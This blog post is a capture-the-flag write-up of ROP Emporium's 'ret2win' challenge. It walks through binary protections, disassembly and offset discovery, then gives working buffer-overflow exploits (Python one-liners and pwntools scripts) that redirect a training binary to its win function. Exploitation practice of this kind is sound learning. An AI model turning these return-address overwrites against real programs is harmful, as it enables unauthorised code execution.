---
layout: post
title: "ROP Emporium - Challenge 1: ret2win"
date: 2025-06-10
author: acfirth
categories: [BinaryExploitation, ROPEmporium]
tags: [Cybersecurity, Binary Exploitation, PWN, ROP Emporium, Buffer Overflow, ret2win]
---

## Contents
- [Challenge Brief](#challenge-brief)
- [x86 (32-bit) Binary Exploitation](#x86-32-bit-binary-exploitation)
    - [Binary Protections](#step-1-understanding-the-protections-on-the-binary)
    - [Disassembling the Binary](#step-2-disassembling-the-binary)
    - [Finding the Offset](#step-3-finding-the-offset)
    - [Writing the Exploit](#step-4-writing-the-exploit)

- [x86-64 (64-bit) Binary Exploitation](#x86-64-64-bit-binary-exploit)
    - [Disassembling the Binary](#step-1-disassemble-the-binary)
    - [Finding the Offset](#step-2-finding-the-offset)
    - [Writing the Exploit](#step-3-writing-the-exploit)

## Introduction
[ROP Emporium](https://ropemporium.com/) is a fantastic website containing **Binary Exploitation** challenges that focus on **Return Oriented Programming (ROP)** and building **ROP Chains** to exploit the binaries.

The challenges are offered in **x86 (32-bit)**, **x86-64 (64-bit)**, **ARMv5** and **MIPS**. I have been able to complete all of the 32-bit and 64-bit challenges, and I will be presenting my solutions and the exploitation path I followed to reach my solution.

In this post, I will be focussing on the first challenge: [**ret2win**](https://ropemporium.com/challenge/ret2win.html).

## Challenge Brief
*"Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack."*

## x86 (32-bit) Binary Exploitation
### Step 1: Understanding the Protections on the Binary
To find out what protections were in place on the binary, I used `checksec` from the `pwntools` module.

```
$ checksec ./ret2win32  

[*] './ret2win32'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

**Checksec** showed me that the binary does not use a canary, great, that makes performing **Buffer Overflows** a bit easier. **NX (No Execute)** is enabled, meaning I cannot put shellcode on the stack and jump to it, which makes sense seeing as these challenges are all about **ROP**. **PIE** is not in place meaning memory addresses should stay the same every time the binary is run, and finally, it is not stripped meaning I can disassemble it much easier.

### Step 2: Disassembling the Binary
To disassemble the binary and locate the functions, I used `objdump`. It shows me the function names, the disassembled Assembly instructions, and memory addresses of the functions and instructions.

I see three interesting functions, the `main()` function, the `pwnme()` function, and the `ret2win()` function.

```
08048546 <main>:
 8048546:       8d 4c 24 04             lea    0x4(%esp),%ecx
 804854a:       83 e4 f0                and    $0xfffffff0,%esp
 804854d:       ff 71 fc                push   -0x4(%ecx)
 8048550:       55                      push   %ebp
 8048551:       89 e5                   mov    %esp,%ebp
 8048553:       51                      push   %ecx
 8048554:       83 ec 04                sub    $0x4,%esp
 8048557:       a1 30 a0 04 08          mov    0x804a030,%eax
 804855c:       6a 00                   push   $0x0
 804855e:       6a 02                   push   $0x2
 8048560:       6a 00                   push   $0x0
 8048562:       50                      push   %eax
 8048563:       e8 98 fe ff ff          call   8048400 <setvbuf@plt>
 8048568:       83 c4 10                add    $0x10,%esp
 804856b:       83 ec 0c                sub    $0xc,%esp
 804856e:       68 e0 86 04 08          push   $0x80486e0
 8048573:       e8 58 fe ff ff          call   80483d0 <puts@plt>
 8048578:       83 c4 10                add    $0x10,%esp
 804857b:       83 ec 0c                sub    $0xc,%esp
 804857e:       68 f8 86 04 08          push   $0x80486f8
 8048583:       e8 48 fe ff ff          call   80483d0 <puts@plt>
 8048588:       83 c4 10                add    $0x10,%esp
 804858b:       e8 1d 00 00 00          call   80485ad <pwnme>
 8048590:       83 ec 0c                sub    $0xc,%esp
 8048593:       68 fd 86 04 08          push   $0x80486fd
 8048598:       e8 33 fe ff ff          call   80483d0 <puts@plt>
 804859d:       83 c4 10                add    $0x10,%esp
 80485a0:       b8 00 00 00 00          mov    $0x0,%eax
 80485a5:       8b 4d fc                mov    -0x4(%ebp),%ecx
 80485a8:       c9                      leave
 80485a9:       8d 61 fc                lea    -0x4(%ecx),%esp
 80485ac:       c3                      ret

080485ad <pwnme>:
 80485ad:       55                      push   %ebp
 80485ae:       89 e5                   mov    %esp,%ebp
 80485b0:       83 ec 28                sub    $0x28,%esp
 80485b3:       83 ec 04                sub    $0x4,%esp
 80485b6:       6a 20                   push   $0x20
 80485b8:       6a 00                   push   $0x0
 80485ba:       8d 45 d8                lea    -0x28(%ebp),%eax
 80485bd:       50                      push   %eax
 80485be:       e8 4d fe ff ff          call   8048410 <memset@plt>
 80485c3:       83 c4 10                add    $0x10,%esp
 80485c6:       83 ec 0c                sub    $0xc,%esp
 80485c9:       68 08 87 04 08          push   $0x8048708
 80485ce:       e8 fd fd ff ff          call   80483d0 <puts@plt>
 80485d3:       83 c4 10                add    $0x10,%esp
 80485d6:       83 ec 0c                sub    $0xc,%esp
 80485d9:       68 68 87 04 08          push   $0x8048768
 80485de:       e8 ed fd ff ff          call   80483d0 <puts@plt>
 80485e3:       83 c4 10                add    $0x10,%esp
 80485e6:       83 ec 0c                sub    $0xc,%esp
 80485e9:       68 88 87 04 08          push   $0x8048788
 80485ee:       e8 dd fd ff ff          call   80483d0 <puts@plt>
 80485f3:       83 c4 10                add    $0x10,%esp
 80485f6:       83 ec 0c                sub    $0xc,%esp
 80485f9:       68 e8 87 04 08          push   $0x80487e8
 80485fe:       e8 bd fd ff ff          call   80483c0 <printf@plt>
 8048603:       83 c4 10                add    $0x10,%esp
 8048606:       83 ec 04                sub    $0x4,%esp
 8048609:       6a 38                   push   $0x38
 804860b:       8d 45 d8                lea    -0x28(%ebp),%eax
 804860e:       50                      push   %eax
 804860f:       6a 00                   push   $0x0
 8048611:       e8 9a fd ff ff          call   80483b0 <read@plt>
 8048616:       83 c4 10                add    $0x10,%esp
 8048619:       83 ec 0c                sub    $0xc,%esp
 804861c:       68 eb 87 04 08          push   $0x80487eb
 8048621:       e8 aa fd ff ff          call   80483d0 <puts@plt>
 8048626:       83 c4 10                add    $0x10,%esp
 8048629:       90                      nop
 804862a:       c9                      leave
 804862b:       c3                      ret

0804862c <ret2win>:
 804862c:       55                      push   %ebp
 804862d:       89 e5                   mov    %esp,%ebp
 804862f:       83 ec 08                sub    $0x8,%esp
 8048632:       83 ec 0c                sub    $0xc,%esp
 8048635:       68 f6 87 04 08          push   $0x80487f6
 804863a:       e8 91 fd ff ff          call   80483d0 <puts@plt>
 804863f:       83 c4 10                add    $0x10,%esp
 8048642:       83 ec 0c                sub    $0xc,%esp
 8048645:       68 13 88 04 08          push   $0x8048813
 804864a:       e8 91 fd ff ff          call   80483e0 <system@plt>
 804864f:       83 c4 10                add    $0x10,%esp
 8048652:       90                      nop
 8048653:       c9                      leave
 8048654:       c3                      ret
 8048655:       66 90                   xchg   %ax,%ax
 8048657:       66 90                   xchg   %ax,%ax
 8048659:       66 90                   xchg   %ax,%ax
 804865b:       66 90                   xchg   %ax,%ax
 804865d:       66 90                   xchg   %ax,%ax
 804865f:       90                      nop
```

**Address of ret2win():** `0x0804862c`

The `main()` function to display some messages to the user before calling the `pwnme()` function, which reads input from the user and writes it into a fixed size buffer created using `memset()`.

Finally, the `ret2win()` function, which is never called, uses `system()` to read the contents of the **flag.txt** file and display them to the user. This is the **win** function that I needed to call.

### Step 3: Finding the Offset
I created a cyclic pattern 100-bytes long using the `pattern create 100` command within **GDB-GEF**. I then ran the program and input the string. The program crashed (**Segmentation Fault**) and **GDB-GEF** presented me with all of the crash information.

![GDB-GEF Segmentation Fault EIP Overwrite](/assets/images/ROP_Emporium/ret2win/finding_the_offset.png)

The `EIP` was overwritten with the value `0x6161616c`. Using the command `pattern offset 0x6161616c`, it calculated that the offset was **44**.

### Step 4: Writing the Exploit
After finding the offset, I then moved onto writing the exploit.

I wrote 3 exploits, a one-line exploit using Python2, a one-line exploit using Python3, and a fully-fledged exploit using the `pwntools` module.

#### Python2 One-Line Exploit
- Print 44 bytes
- Provide the address of ret2win() in Little-Endian

`python2 -c 'print "A"*44 + "\x2c\x86\x04\x08"'`

```
$ python2 -c 'print "A"*44 + "\x2c\x86\x04\x08"' | ./ret2win32

ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
```

#### Python3 One-Line Exploit
Python3 is a little bit different, compared to the Python2 exploit, as it doesn't print byte strings the same way as Python2 does. To get around this, I used the `sys.stdout.buffer.write()` function from the `sys` module.

`python3 -c 'import sys; sys.stdout.buffer.write(b"A"*44 + b"\x2c\x86\x04\x08")'`

```
$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*44 + b"\x2c\x86\x04\x08")' | ./ret2win

ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
```

#### The Pwntools Exploit
I like to use my own template for writing exploits in `pwntools`.

```
#!/usr/bin/env python3

from pwn import *

# Set the binary context to the local binary
context.binary = binary = ELF("./ret2win32", checksec=False)
context.log_level = "CRITICAL"

# Get the LIBC used for the binary
libc = binary.libc

gdb_script = """
continue
"""

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(args.HOST or exit("[!] Provide a Remote IP."), int(args.PORT or exit("[!] Provide a Remote Port.")))

    elif args.GDB:
        return gdb.debug([binary.path] + argv, gdbscript=gdb_script, *a, **kw)

    else:
        return process([binary.path] + argv, *a, **kw)

# Exploitation code
# Define the offset (44 bytes)
offset = 44
# Create the buffer (44 A's)
buffer = b"A"*offset

# Pack the address of ret2win() into a Little-Endian 32-bit address
win = p32(0x0804862c)

# Define the payload as the buffer + the packed address of ret2win()
payload = buffer + win

# Start connection (LOCAL, REMOTE, or GDB)
p = start()

# Send the payload after the ">" prompt
p.sendlineafter(b"> ", payload)
p.interactive()

# Close connection
p.close()
```

Running the exploit script, I get the output:
```
$ python3 exploit.py

Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
```

## x86-64 (64-bit) Binary Exploit
For the 64-bit binary, I followed the same steps as before:

- Disassemble the binary
- Find the offset
- Build the exploit

### Step 1: Disassemble the Binary
`objdump -d ./ret2win`
```
0000000000400697 <main>:
  400697:       55                      push   %rbp
  400698:       48 89 e5                mov    %rsp,%rbp
  40069b:       48 8b 05 b6 09 20 00    mov    0x2009b6(%rip),%rax        # 601058 <stdout@GLIBC_2.2.5>
  4006a2:       b9 00 00 00 00          mov    $0x0,%ecx
  4006a7:       ba 02 00 00 00          mov    $0x2,%edx
  4006ac:       be 00 00 00 00          mov    $0x0,%esi
  4006b1:       48 89 c7                mov    %rax,%rdi
  4006b4:       e8 e7 fe ff ff          call   4005a0 <setvbuf@plt>
  4006b9:       bf 08 08 40 00          mov    $0x400808,%edi
  4006be:       e8 8d fe ff ff          call   400550 <puts@plt>
  4006c3:       bf 20 08 40 00          mov    $0x400820,%edi
  4006c8:       e8 83 fe ff ff          call   400550 <puts@plt>
  4006cd:       b8 00 00 00 00          mov    $0x0,%eax
  4006d2:       e8 11 00 00 00          call   4006e8 <pwnme>
  4006d7:       bf 28 08 40 00          mov    $0x400828,%edi
  4006dc:       e8 6f fe ff ff          call   400550 <puts@plt>
  4006e1:       b8 00 00 00 00          mov    $0x0,%eax
  4006e6:       5d                      pop    %rbp
  4006e7:       c3                      ret

00000000004006e8 <pwnme>:
  4006e8:       55                      push   %rbp
  4006e9:       48 89 e5                mov    %rsp,%rbp
  4006ec:       48 83 ec 20             sub    $0x20,%rsp
  4006f0:       48 8d 45 e0             lea    -0x20(%rbp),%rax
  4006f4:       ba 20 00 00 00          mov    $0x20,%edx
  4006f9:       be 00 00 00 00          mov    $0x0,%esi
  4006fe:       48 89 c7                mov    %rax,%rdi
  400701:       e8 7a fe ff ff          call   400580 <memset@plt>
  400706:       bf 38 08 40 00          mov    $0x400838,%edi
  40070b:       e8 40 fe ff ff          call   400550 <puts@plt>
  400710:       bf 98 08 40 00          mov    $0x400898,%edi
  400715:       e8 36 fe ff ff          call   400550 <puts@plt>
  40071a:       bf b8 08 40 00          mov    $0x4008b8,%edi
  40071f:       e8 2c fe ff ff          call   400550 <puts@plt>
  400724:       bf 18 09 40 00          mov    $0x400918,%edi
  400729:       b8 00 00 00 00          mov    $0x0,%eax
  40072e:       e8 3d fe ff ff          call   400570 <printf@plt>
  400733:       48 8d 45 e0             lea    -0x20(%rbp),%rax
  400737:       ba 38 00 00 00          mov    $0x38,%edx
  40073c:       48 89 c6                mov    %rax,%rsi
  40073f:       bf 00 00 00 00          mov    $0x0,%edi
  400744:       e8 47 fe ff ff          call   400590 <read@plt>
  400749:       bf 1b 09 40 00          mov    $0x40091b,%edi
  40074e:       e8 fd fd ff ff          call   400550 <puts@plt>
  400753:       90                      nop
  400754:       c9                      leave
  400755:       c3                      ret

0000000000400756 <ret2win>:
  400756:       55                      push   %rbp
  400757:       48 89 e5                mov    %rsp,%rbp
  40075a:       bf 26 09 40 00          mov    $0x400926,%edi
  40075f:       e8 ec fd ff ff          call   400550 <puts@plt>
  400764:       bf 43 09 40 00          mov    $0x400943,%edi
  400769:       e8 f2 fd ff ff          call   400560 <system@plt>
  40076e:       90                      nop
  40076f:       5d                      pop    %rbp
  400770:       c3                      ret
  400771:       66 2e 0f 1f 84 00 00    cs nopw 0x0(%rax,%rax,1)
  400778:       00 00 00 
  40077b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
```

**Address of ret2win():** `0x0000000000400756`

### Step 2: Finding the Offset
![GDB-GEF Segmentation Fault RSP Overwrite](/assets/images/ROP_Emporium/ret2win/finding_the_offset_64-bit.png)

The `RSP` register was overwritten with the value `0x6161616161616166`. Using the command `pattern offset 0x6161616161616166` in `GDB-GEF`, it calculated the offset to be **40**.

### Step 3: Writing the Exploit
I again, wrote exploits in Python2, Python3, and `pwntools`.

I found that when returning to the `ret2win()` function, it was not printing the flag although the function was being called successfully. I discovered that adding `0x2` onto the address of `ret2win()` it worked perfectly fine. This usually occurs in 64-bit binaries when the function starts with an `endbr64` instruction. Although the `ret2win()` function in this binary does not, the issue still occurs oddly enough.

#### Python2 One-Line Exploit
`python2 -c 'print "A"*40 + "\x58\x07\x40\x00\x00\x00\x00\x00"'`
```
$ python2 -c 'print "A"*40 + "\x58\x07\x40\x00\x00\x00\x00\x00"' | ./ret2win

ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
```

#### Python3 One-Line Exploit
`python3 -c 'import sys;sys.stdout.buffer.write(b"A"*40 + b"\x58\x07\x40\x00\x00\x00\x00\x00")'`
```
$ python3 -c 'import sys;sys.stdout.buffer.write(b"A"*40 + b"\x58\x07\x40\x00\x00\x00\x00\x00")' | ./ret2win

ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
```

#### The Pwntools Exploit
```
#!/usr/bin/env python3

from pwn import *

# Set the binary context to the local binary
context.binary = binary = ELF("./ret2win", checksec=False)
context.log_level = "CRITICAL"

# Get the LIBC used for the binary
libc = binary.libc

gdb_script = """
continue
"""

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(args.HOST or exit("[!] Provide a Remote IP."), int(args.PORT or exit("[!] Provide a Remote Port.")))

    elif args.GDB:
        return gdb.debug([binary.path] + argv, gdbscript=gdb_script, *a, **kw)

    else:
        return process([binary.path] + argv, *a, **kw)

# Exploitation code
# Define the offset of 40
offset = 40
# Build the 40 byte buffer
buffer = b"A"*offset

# Pack the address of the ret2win() function into a Little-Endian 64-bit address (+ 0x2)
win = p64(0x0000000000400756 + 0x2)

# Build the payload, the buffer + the packed address of ret2win()
payload = buffer + win

# Start connection (LOCAL, REMOTE, or GDB)
p = start()

# Send the payload after the ">" prompt
p.sendlineafter(b"> ", payload)
# Receive all of the output from the binary and print it
print(p.recvallS())

# Close connection
p.close()
```

Running the exploit script, I got the output:
```
$ python3 exploit.py

Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
```

**Success!** Both, the x86 and x86-64 challenges have been solved successfully!